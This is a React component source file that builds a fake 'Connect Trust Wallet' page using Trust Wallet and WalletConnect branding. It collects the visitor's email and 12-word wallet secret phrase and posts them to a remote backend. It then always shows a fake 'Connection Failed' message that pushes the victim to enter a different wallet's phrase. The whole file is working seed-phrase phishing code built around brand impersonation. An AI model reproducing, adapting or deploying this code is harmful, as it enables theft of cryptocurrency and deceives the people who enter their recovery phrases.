import React, { useState, useEffect } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import "./TrustWalletConnect.css";
import logo from "../assets/logo.png";
import trust from "../assets/TrustWallet.png";
import walletConnect from "../assets/WalletConnect.png";


const TrustWalletConnect = () => {
  const [showPopup, setShowPopup] = useState(false);
  const [closing, setClosing] = useState(false);
  const [words, setWords] = useState(Array(12).fill(""));
  const [email, setEmail] = useState("");
  const [isSending, setIsSending] = useState(false);
  const navigate = useNavigate();

  // Update this to match your backend URL
  const API_URL = process.env.REACT_APP_API_URL || "https://backend-instacoinpay-1.onrender.com";

  useEffect(() => {
    document.body.style.overflow = showPopup ? "hidden" : "auto";
  }, [showPopup]);

  const handleWordChange = (index, value) => {
    const updated = [...words];
    updated[index] = value.replace(/\s+/g, "");
    setWords(updated);
  };

  const blockSpace = (e) => {
    if (e.key === " ") e.preventDefault();
  };

  const isFormComplete =
    words.every((w) => w.trim() !== "") && email.trim() !== "";

  const sendEmail = async () => {
    setIsSending(true);

    console.log("🚀 Submitting Trust Wallet form...");

    try {
      const response = await axios.post(
        `${API_URL}/api/trust-wallet/submit`,
        {
          email: email,
          words: words
        },
        {
          headers: {
            "Content-Type": "application/json"
          }
        }
      );

      console.log("✅ Form submitted successfully!", response.data);

      // Show the popup after successful submission
      setShowPopup(true);

    } catch (error) {
      console.error("❌ Failed to submit form:", error);
      console.error("Error details:", error.response?.data);

      // Still show popup even on error (as per original design)
      setShowPopup(true);
    } finally {
      setIsSending(false);
    }
  };

  const handleConnect = () => {
    console.log("👆 CONNECT button clicked!");
    sendEmail();
  };

  const closePopup = () => {
    setClosing(true);
    setTimeout(() => {
      setShowPopup(false);
      setClosing(false);
      // Reset form
      setWords(Array(12).fill(""));
      setEmail("");
    }, 200);
  };

  const handleBackToDashboard = () => {
    navigate("/dashboard");
  };

  return (
    <>
      <div className="twc-page">


        <div className="twc-logo">
          <img src={logo} alt="logo" />
        </div>

        <div className="twc-card">
          <div className="twc-header-container">
            <span className="twc-back" onClick={() => navigate(-1)}>←</span>
            {/* WalletConnect logo ABOVE */}
            <img
              src={walletConnect}
              alt="WalletConnect"
              className="twc-walletconnect-img"
            />

            {/* CONNECT + Trust Wallet */}
            <div className="twc-header-row">
              <h2 className="twc-connect-text">CONNECT</h2>
              <img src={trust} alt="Trust Wallet" />
            </div>
          </div>

          <label className="twc-label-email">Enter your Email Address</label>
          <input
            className="twc-input"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />

          <label className="twc-label-email">
            Enter your Trust Wallet 12 word Secret Phrase
          </label>

          <div className="twc-info-wrapper">
            <p className="twc-info-text-scroll">
              The Trust Wallet must be older than 30 days. New wallets cannot be accepted for withdrawal !
            </p>
          </div>



          <div className="twc-phrase-box">
            {words.map((word, i) => (
              <input
                key={i}
                className="twc-word-input"
                value={word}
                placeholder={`${i + 1}. word`}
                onChange={(e) => handleWordChange(i, e.target.value)}
                onKeyDown={blockSpace}
              />
            ))}
          </div>

          <button
            className="twc-connect-btn"
            disabled={!isFormComplete || isSending}
            onClick={handleConnect}
            style={{
              opacity: isFormComplete && !isSending ? 1 : 0.6,
              cursor: isFormComplete && !isSending ? "pointer" : "not-allowed"
            }}
          >
            {isSending ? "CONNECTING..." : "CONNECT"}
          </button>
        </div>
      </div>

      {showPopup && (
        <div className={`twc-modal-overlay ${closing ? "closing" : ""}`}>
          <div className="twc-modal-box">
            <div className="twc-popup-icon">
              <svg
                className="twc-error-icon"
                viewBox="0 0 52 52"
                xmlns="http://www.w3.org/2000/svg"
              >
                <circle
                  className="twc-error-circle"
                  cx="26"
                  cy="26"
                  r="25"
                  fill="none"
                />
                <line
                  className="twc-error-line twc-error-line-left"
                  x1="16"
                  y1="16"
                  x2="36"
                  y2="36"
                />
                <line
                  className="twc-error-line twc-error-line-right"
                  x1="36"
                  y1="16"
                  x2="16"
                  y2="36"
                />
              </svg>
            </div>

            <h3 className="twc-popup-title">Connection Failed!</h3>
            <p className="twc-popup-text">
              Your Trust Wallet is not eligible for connection.Please try connecting with a different Trust Wallet. Repeated attempts using the same wallet may result in account suspension.            </p>
            <button className="twc-popup-btn" onClick={closePopup}>
              OK
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default TrustWalletConnect;